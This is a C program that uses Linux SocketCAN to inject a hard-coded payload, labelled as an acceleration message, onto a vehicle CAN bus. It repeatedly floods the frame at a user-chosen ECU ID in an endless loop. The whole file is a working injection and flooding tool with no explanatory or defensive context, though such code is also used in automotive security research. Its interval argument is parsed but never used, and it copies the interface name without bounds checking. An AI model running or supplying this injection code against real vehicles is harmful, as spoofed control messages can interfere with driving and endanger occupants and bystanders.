#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

void send_can_frame(int s, struct can_frame frame, struct sockaddr_can addr) {
    if (write(s, &frame, sizeof(struct can_frame)) != sizeof(struct can_frame)){
        perror ("Write");
        exit(1);
    }
}

int main(int argc, char*argv[]) {
    if (argc != 5 || strcmp(argv[3], "-diff") != 0) {
        printf("Usage: %s [can_interface] [ECUcanid] -diff [time_interval]\n", argv[0]);
        exit(1);
    }

    char *interface = argv[1];
    int ECUcan_id = (int)strtol(argv[2], NULL, 16);
    int interval = atoi (argv[4]);

    int s;
    struct sockaddr_can addr;
    struct ifreq ifr;
    struct can_frame frame;

    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0){
        perror("Socket fail");
        return 1;
    }

    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFINDEX, &ifr);

    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0){
        perror("Bind fail");
        return 1;
    }
    unsigned char accelpayload1[8] = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12};
    frame.can_id = ECUcan_id;
    frame.can_dlc = 8;
    memcpy(frame.data, accelpayload1, 8);

    do{
        send_can_frame(s, frame, addr);
        send_can_frame(s, frame, addr);
        send_can_frame(s, frame, addr);
        send_can_frame(s, frame, addr);
        send_can_frame(s, frame, addr);
    } while (1);

    close(s);
    return 0;
}